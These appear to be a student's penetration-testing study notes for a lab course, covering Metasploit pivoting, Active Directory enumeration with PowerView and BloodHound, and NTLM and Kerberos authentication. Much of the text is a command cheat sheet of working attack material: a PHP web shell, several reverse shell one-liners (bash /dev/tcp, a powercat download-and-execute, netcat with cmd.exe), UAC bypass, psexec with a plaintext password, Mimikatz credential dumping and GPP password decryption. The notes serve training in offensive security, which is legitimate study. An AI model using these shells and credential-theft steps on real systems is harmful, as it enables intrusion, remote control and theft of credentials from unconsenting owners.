TCP port scan via the compromised machine
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run
```

```
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION 9
set LHOST 192.168.119.4
run
```

Added route will only work with established connections => the new shell on the target must be a bind shell, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network

```
use exploit/windows/smb/psexec
set SMBUser luiza
set SMBPass "BoccieDearAeroMeow1!"
set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

Add a route to a network reachable through a compromised host
```
route add 172.16.5.0/24 12 
route print
route flush
```

```
use multi/manage/autoroute
set session 12
run
```

Configure a SOCKS proxy => allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

### Meterpreter Command

Retrieve LM/NTLM creds (parsed)
```
load kiwi
creds_msv
```

Create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200)
```
portfwd -h
portfwd add -l 3389 -p 3389 -r 172.16.5.200 
```

## Resource Scripts
We can configure the AutoRunScript option to automatically execute a module after a session was created. E.g., the post/windows/manage/migrate module will cause the spawned Meterpreter to automatically launch a background notepad.exe process and migrate to it.

**Automating process migration** helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process.

`set ExitOnSession false` to ensure that the listener keeps accepting new connections after a session is created.

There are resource scripts provided for port scanning, brute forcing, protocol enumerations, and so on. Some of these scripts use the global datastore of Metasploit to set options such as RHOSTS. When we use `set` or `unset`, we define options in the context of a running module. However, we can also define values for options across all modules by setting global options. These options can be set with `setg` and unset with `unsetg`.

`listener.rc`
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

```bash
sudo msfconsole -r listener.rc
```

```bash
ls -l /usr/share/metasploit-framework/scripts/resource
```

## Active Directory Introduction and Enumeration
Members of Domain Admins are among the most privileged objects in the domain.

An AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest.

While there is a Domain Admins group for each domain in the forest, members of the Enterprise Admins group are granted full control over all the domains in the forest and have Administrator privilege on all DCs.

### Active Directory - Manual Enumeration
use PowerShell and .NET classes to create a script that enumerates the domain.

We'll leverage an **Active Directory Services Interface (ADSI)** (a set of interfaces built on COM) as an LDAP provider. We need a specific LDAP **ADsPath** in order to communicate with the AD service:

LDAP://HostName[:PortNumber][/DistinguishedName]

- The Hostname can be a computer name, IP address or a domain name. E.g., corp.com domain. Note that a domain may have multiple DCs, so setting the domain name could potentially resolve to the IP address of any DC in the domain. To make our enumeration as accurate as possible, we should look for the DC that holds the most updated information, aka the **Primary Domain Controller (PDC)**. There can be only one PDC in a domain. To find the PDC, we need to find the DC holding the PdcRoleOwner property.
- The PortNumber is optional. It will automatically choose the port based on whether or not we are using an SSL connection. If we come across a domain using non-default ports, we may need to manually add this to the script.
- DistinguishedName (DN) is a part of the LDAP path. A DN is a name that uniquely identifies an object in AD, including the domain itself.

Objects in AD (or other directory services) must be formatted according to a specific naming standard. E.g., stephanie domain user, a user object within the corp.com domain:

CN=Stephanie,CN=Users,DC=corp,DC=com

- CN is known as the **Common Name**, which specifies the identifier of an object in the domain. If we added CN=Users to our LDAP path, we would restrict ourselves by only being able to search objects within that given container.
- "DC" means **Domain Component** when we are referring to a **Distinguished Name**. The Domain Component represents the top of an LDAP tree or the Distinguished Name of the domain itself, DC=corp,DC=com.

**PowerView**

```
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
net user /domain print out the users in the domain
net user jeffadmin /domain
net group /domain
net group "Sales Department" /domain
.\enumeration.ps1
Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)" user enumeration
LDAPSearch -LDAPQuery "(objectclass=group)" list all the groups in the domain
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties \ select {$_.cn}, {$_.member} } enumerate every group available in the domain and also display the user members
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
$group.properties.member
Import-Module .\PowerView.ps1
Get-NetDomain get basic information about the domain
Get-NetUser \ select cn,pwdlastset,lastlogon list all users in the domain
Get-NetGroup \ select cn enumerate groups
Get-NetGroup "Sales Department" \ select member
```

#### enumeration.ps1

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)

# enumerate all users in the domain and extract all the properties for each object
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
 Write-Host "-------------------------------"
}

# display the groups "jeffadmin" is a member of
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop.memberof
 }
 Write-Host "-------------------------------"
}


#### function.ps1, make the script more flexible, allowing us to add the required parameters via the command line

function LDAPSearch {
 param (
 [string]$LDAPQuery
 )

 $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
 $DistinguishedName = ([adsi]'').distinguishedName

 $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

 $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

 return $DirectorySearcher.FindAll()
}


### Manual Enumeration - Expanding our Repertoire
PowerView's Find-LocalAdminAccess command scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain. The command relies on the OpenServiceW function, which will connect to the **Service Control Manager (SCM)** on the target machines. The SCM essentially maintains a database of installed services and drivers on Windows computers. PowerView will attempt to open this database with the SC_MANAGER_ALL_ACCESS access right, which require administrative privileges, and if the connection is successful, PowerView will deem that our current user has administrative privileges on the target machine.

To know which user is logged in to which computer, historically, the 2 most reliable Windows APIs that could (and still may) help us achieve these goals are NetWkstaUserEnum and NetSessionEnum. The former requires administrative privileges, while the latter does not. However, Windows has undergone changes, possibly making the discovery of logged in user enumeration more difficult for us.

PowerView's Get-NetSession command uses the **NetWkstaUserEnum** and **NetSessionEnum** APIs under the hood. Due to permissions, **NetSessionEnum** will not be able to obtain this type of information on default Windows 11 (returns an "Access is denied"):
- According to the documentation, there are 5 possible query levels: 0,1,2,10,502.
 - Level 0 only returns the name of the computer establishing the session.
 - Levels 1 and 2 return more information but require administrative privileges
 - Levels 10 and 502, both should return information such as the name of the computer and name of the user establishing the connection.
- By default, PowerView uses query level 10 with NetSessionEnum
The permissions required to enumerate sessions with NetSessionEnum are defined in the **SrvsvcSessionInfo** registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.
 - The BUILTIN group, NT AUTHORITY group, CREATOR OWNER and APPLICATION PACKAGE AUTHORITY are defined by the system, and do not allow NetSessionEnum to enumerate this registry key from a remote standpoint.
 - The long string in the end of the output is a **capability SID**. A capability SID is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources. However, it will not give us remote access to the registry key of interest.
 - In older Windows versions, Authenticated Users were allowed to access the registry hive and obtain information from the SrvsvcSessionInfo key. However, following the least privilege principle, regular domain users should not be able to acquire this information within the domain.

**PsLoggedOn** application from the **SysInternals Suite**. will enumerate the registry keys under HKEY_USERS to retrieve the security identifiers (SID) of logged-in users and convert the SIDs to usernames. PsLoggedOn will also use the NetSessionEnum API to see who is logged on to the computer via resource shares.

PsLoggedOn relies on the **Remote Registry** service in order to scan the associated key. The Remote Registry service has not been enabled by default on Windows workstations since Windows 8, but system administrators may enable it for various administrative tasks, for backwards compatibility, or for installing monitoring/deployment tools, scripts, agents, etc.

It is also enabled by default on later Windows **Server** Operating Systems such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). If it is enabled, the service will stop after 10 minutes of inactivity to save resources, but it will re-enable (with an automatic trigger) once we connect with PsLoggedOn.

**services** launched by the system itself run in the context of a **Service Account**, i.e., isolated applications can use a set of predefined service accounts, such as LocalSystem, LocalService, and NetworkService.

For more complex applications, a **domain user account** may be used to provide the needed context while still maintaining access to resources inside the domain.

When applications like Exchange, MS SQL, or IIS are integrated into AD, a unique service instance identifier known as **Service Principal Name (SPN)** associates a service to a specific service account in Active Directory.

**Managed Service Accounts**, introduced with Windows Server 2008 R2, were designed for complex applications, which require tighter integration with Active Directory.
Larger applications like MS SQL and Microsoft Exchange often required server redundancy when running to guarantee availability, but Managed Service Accounts did not support this. To remedy this, **Group Managed Service Accounts** were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher. Because of this, some organizations may still rely on basic Service Accounts.

We can obtain the **IP address and port number** of applications running on servers integrated with AD by simply **enumerating all SPNs in the domain**..

An object in AD may have a set of permissions applied to it with multiple A**ccess Control Entries (ACE)**. These ACEs make up the **Access Control List (ACL)**. Each ACE defines whether access to the specific object is allowed or denied.

E.g., a domain user attempts to access a domain share (which is also an object). The targeted object, i.e., the share, will then go through a validation check based on the ACL to determine if the user has permissions to the share. This ACL validation involves 2 main steps. In an attempt to access the share, the user will send an access token, which consists of the user identity and permissions. The target object will then validate the token against the list of permissions (the ACL).

AD includes a wealth of permission types that can be used to configure an ACE:
- GenericAll: Full permissions on object
- GenericWrite: Edit certain attributes on the object
- WriteOwner: Change ownership of the object
- WriteDACL: Edit ACE's applied to object
- AllExtendedRights: Change password, reset password, etc.
- ForceChangePassword: Password change for object
- Self (Self-Membership): Add ourselves to for example a group

**SYSVOL** may include files and folders that reside on the domain controller itself. It is typically used for various domain policies and scripts. By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.

Historically, system administrators often changed local workstation passwords through Group Policy Preferences (GPP). However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on MSDN. We can use this key to decrypt these encrypted passwords.


Get-NetComputer \ select operatingsystem,dnshostname enumerate the computer objects in the domain
Find-LocalAdminAccess scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain, this command supports parameters such as Computername and Credentials
Get-NetSession -ComputerName files04 -Verbose To obtain which user is logged in to which computer
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ \ fl retrieve the permissions for the object we define with the -Path flag
Get-NetComputer \ select dnshostname,operatingsystem,operatingsystemversion
.\PsLoggedon.exe \\files04
setspn -L iis_service -L to run against both servers and clients in the domain to search for a specific SPNs by iis_service user
Get-NetUser -SPN \ select samaccountname,serviceprincipalname
nslookup.exe web04.corp.com
Get-ObjectAcl -Identity stephanie enumerate a user to determine which ACEs are applied to it, the output lists Security Identifiers (SID), e.g., "S-1-5-21-1987370270-658905905-1781884369-1104", and ActiveDirectoryRights property describes the type of permission applied to the object
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104 convert SID to an actual domain object name
Get-ObjectAcl -Identity "Management Department" \ ? {$_.ActiveDirectoryRights -eq "GenericAll"} \ select SecurityIdentifier,ActiveDirectoryRights filter the ActiveDirectoryRights property
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" \ Convert-SidToName
Find-InterestingDomainAcl \ select identityreferencename,activedirectoryrights,acetype,objectdn \ ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} \ ft
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain
Find-DomainShare find the shares in the domain, add the -CheckShareAccess flag to display shares only available to us
ls \\dc1.corp.com\sysvol\corp.com\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" decrypts a given GPP encrypted string

### Active Directory - Automated Enumeration

Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
sudo neo4j start
http://localhost:7474 default credentials (neo4j as both username and password)
bloodhound use the **Upload Data** function on the right side of the GUI to upload the zip file, or drag-and-drop it into BloodHound's main window

## Attacking Active Directory Authentication
### Understanding Active Directory Authentication
Active Directory supports several older protocols including **WDigest**. While these may be useful for older operating systems like Windows 7 or Windows Server 2008 R2

NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname),1 or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.
The NTLM authentication protocol consists of seven steps:

![NTLM authentication](NTLM.png)

In the first step, the computer calculates a cryptographic hash, called the NTLM hash, from the user's password. Next, the client computer sends the username to the server, which returns a random value called the nonce or challenge. The client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.
The server forwards the response along with the username and the nonce to the domain controller. The validation is then performed by the domain controller, since it already knows the NTLM hash of all users. The domain controller encrypts the nonce itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.
As with any other cryptographic hash, NTLM cannot be reversed. However, it is considered a fast-hashing algorithm since short passwords can be cracked quickly using modest equipment.2
By using cracking software like Hashcat3 with top-of-the-line graphic processors, it is possible to test over 600 billion NTLM hashes every second. This means that eight-character passwords may be cracked within 2.5 hours and nine-character passwords may be cracked within 11 days.
However, even with its relative weaknesses, completely disabling and blocking NTLM authentication requires extensive planning and preparation4 as it's an important fallback mechanism and used by many third-party applications. Therefore, we'll encounter enabled NTLM authentication in a majority of assessments.
Now that we've briefly covered NTLM authentication, in the next section we'll begin exploring Kerberos. Kerberos is the default authentication protocol in Active Directory and for associated services.

The Kerberos authentication protocol used by Microsoft is adopted from Kerberos version 5 created by MIT. Kerberos has been used as Microsoft's primary authentication mechanism since Windows Server 2003. While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.
A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself, as discussed in the previous section. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC).1 The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

![Kerberos Authentication](Kerberos.png)

Let's review this process in detail. First, when a user logs in to their workstation, an Authentication Server Request (AS-REQ) is sent to the domain controller. The domain controller, acting as a KDC, also maintains the Authentication Server service. The AS-REQ contains a timestamp that is encrypted using a hash derived from the password of the user2 and their username.
When the domain controller receives the request, it looks up the password hash associated with the specific user in the ntds.dit3 file and attempts to decrypt the timestamp. If the decryption process is successful and the timestamp is not a duplicate, the authentication is considered successful.
If the timestamp is a duplicate, it could indicate evidence of a potential replay attack.
Next, the domain controller replies to the client with an Authentication Server Reply (AS-REP). Since Kerberos is a stateless protocol, the AS-REP contains a session key and a Ticket Granting Ticket (TGT). The session key is encrypted using the user's password hash and may be decrypted by the client and then reused. The TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key.
To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the krbtgt4 account) known only to the KDC and cannot be decrypted by the client. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for ten hours, after which a renewal occurs. This renewal does not require the user to re-enter their password.
When the user wishes to access resources of the domain, such as a network share or a mailbox, it must again contact the KDC.
This time, the client constructs a Ticket Granting Service Request (TGS-REQ) packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT.
Next, the ticket-granting service on the KDC receives the TGS-REQ, and if the resource exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. At this point the KDC performs several checks:
1.	The TGT must have a valid timestamp.
2.	The username from the TGS-REQ has to match the username from the TGT.
3.	The client IP address needs to coincide with the TGT IP address.
If this verification process succeeds, the ticket-granting service responds to the client with a Ticket Granting Server Reply (TGS-REP). This packet contains three parts:
1.	The name of the service for which access has been granted.
2.	A session key to be used between the client and the service.
3.	A service ticket containing the username and group memberships along with the newly-created session key.
The service ticket's service name and session key are encrypted using the original session key associated with the creation of the TGT. The service ticket is encrypted using the password hash of the service account registered with the service in question.
Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins.
First, the client sends the application server an Application Request (AP-REQ), which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.
The application server decrypts the service ticket using the service account password hash and extracts the username and the session key. It then uses the latter to decrypt the username from the AP-REQ. If the AP-REQ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.
This protocol may seem complicated and perhaps even convoluted, but it was designed to mitigate various network attacks and prevent the use of fake credentials.
Now that we have discussed the foundations of both NTLM and Kerberos authentication, let's explore various cached credential storage and service account attacks.





























































































































## Miscellaneous
### Web Shell

<?php echo system($_GET['cmd']); ?> PHP web shell

### Reverse Shell

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

Bash TCP reverse shell one-liner
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
```pwsh
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\/bin/sh -i 2>&1\nc 192.168.118.2 1234 >/tmp/f
python3 -c 'import pty; pty.spawn("/bin/bash")'
nc.exe -e cmd.exe 192.168.118.4 4446
```

# File Transfer

Upload the file to the SMB share
```bash
smbclient //192.168.50.195/share -c 'put test.txt' 
```

```bash
iwr -Uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
scp cve-2017-16995.c joe@192.168.123.216:
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

### Linux Miscellaneous

sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32 **Win32**, if not adding the -lws2_32 parameter the linker cannot find the winsock library
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe **Win64**
echo -n "abcde" \ wc -c count characters
sed -i '/^1/d' demo.txt ^1 referring to all lines starting with a "1", deleting them with d, and doing the editing in place with -i
crunch 6 6 -t Lab%%% > wordlist generate a custom wordlist, set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first 3 characters to Lab followed by three numeric digits
gcc cve-2017-16995.c -o cve-2017-16995
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
find / -name nc.exe 2>/dev/null find nc.exe from our Kali windows-resources/binaries directory








### Windows Miscellaneous
```pwsh
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
runas /user:backupadmin cmd start cmd as user backupadmin
powershell -ep bypass
. .\PowerUp.ps1 Import a script file, relative path
Import-Module NtObjectManager To display the integrity level of a process, we can use third-party PowerShell modules such as NtObjectManager
Get-NtTokenIntegrityLevel display the integrity level of the current process by retrieving and reviewing the assigned access token






dism /online /Enable-Feature /FeatureName:TelnetClient

### SSH

 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
chmod 600 id_rsa SSH private key permissions
ssh -i id_rsa -p 2222 offsec@mountain.com use the private key to connect to the target system via SSH on port 2222
rm ~/.ssh/known_hosts remove SSH known_hosts file

### iptables

sudo iptables -I INPUT 1 -s 192.168.50.149 -j ACCEPT -I option to insert a new rule into a given chain, -s to specify a source IP address
sudo iptables -I OUTPUT 1 -d 192.168.50.149 -j ACCEPT -d to specify a destination IP address
sudo iptables -Z zero the packet and byte counters in all chains
sudo iptables -vn -L 